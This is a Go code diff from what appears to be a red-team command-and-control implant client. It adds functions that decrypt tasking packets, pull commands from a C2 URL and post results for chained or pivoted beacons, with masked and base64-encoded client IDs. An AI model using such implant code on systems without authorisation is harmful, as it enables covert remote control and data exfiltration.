@@ -35,23 +35,26 @@ func WriteInt(nInt int) []byte {
 	return bBytes
 }
 
+func WriteLittleInt(nInt int) []byte {
+	bBytes := make([]byte, 4)
+	binary.LittleEndian.PutUint32(bBytes, uint32(nInt))
+	return bBytes
+}
+
 func ReadInt(b []byte) uint32 {
 	return binary.BigEndian.Uint32(b)
 }
+
+func ReadLittleInt(b []byte) uint32 {
+	return binary.LittleEndian.Uint32(b)
+}
+
 
 func ReadShort(b []byte) uint16 {
 	return binary.BigEndian.Uint16(b)
 }
 
-func DecryptPacket(b []byte) ([]byte, bool) {
-	// hmacHash := b[len(b)-crypt.HmacHashLen:]
-	// fmt.Printf("hmac hash: %v\n", hmacHash)
-	// //TODO check the hmachash
-	// restBytes := b[:len(b)-crypt.HmacHashLen]
-	// fmt.Printf("Length of restBytes: %d\n", len(restBytes))
-
-	hmacVerfied := false
-
+func ProfileDecryptPacket(b []byte) []byte {
 	// first base64decode, then unmask
 	xored := make([]byte, base64.URLEncoding.WithPadding(base64.NoPadding).DecodedLen(len(b)))
 	_, err := base64.URLEncoding.WithPadding(base64.NoPadding).Decode(xored, b)
@@ -66,6 +69,15 @@ func DecryptPacket(b []byte) ([]byte, bool) {
 
 	fmt.Printf("Length of decoded data: %d\n", len(decrypted))
 	fmt.Printf("%v\n", decrypted)
+
+	return decrypted
+}
+
+func DecryptPacket(b []byte) ([]byte, bool) {
+
+	hmacVerfied := false
+
+	decrypted := ProfileDecryptPacket(b)
 
 	// if the data length is greater than 0, then we received a command!
 	// Otherwise, it is just an acceptance of our checkin request, and as such does not contain a command nor an HMAC
@@ -320,9 +332,27 @@ func PullCommand() *req.Resp {
 	return resp
 }
 
+func PullChainCommand(encryptedChainMetaInfo []byte) *req.Resp {
+	fmt.Printf("PullCommand encryptedMetaInfo: %x \n", encryptedChainMetaInfo)
+	resp := HttpGet(config.GetUrl, string(EncryptPacket(encryptedChainMetaInfo)))
+	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
+	fmt.Printf("%v \n", resp)
+	return resp
+}
+
 func PushResult(b []byte) *req.Resp {
 	// url := config.PostUrl + strconv.Itoa(clientID)
 	maskedClientID := mask([]byte(strconv.Itoa(clientID)))
+	base64ClientID := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(maskedClientID)
+	url := config.PostUrl + string(base64ClientID) + "RGVsb2l0dGUgQzIK"
+	resp := HttpPost(url, b)
+	fmt.Printf("pushresult: %v\n", resp.Request().URL)
+	return resp
+}
+
+func PushChainResult(chainClientId int, b []byte) *req.Resp {
+	// url := config.PostUrl + strconv.Itoa(clientID)
+	maskedClientID := mask([]byte(strconv.Itoa(chainClientId)))
 	base64ClientID := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(maskedClientID)
 	url := config.PostUrl + string(base64ClientID) + "RGVsb2l0dGUgQzIK"
 	resp := HttpPost(url, b)
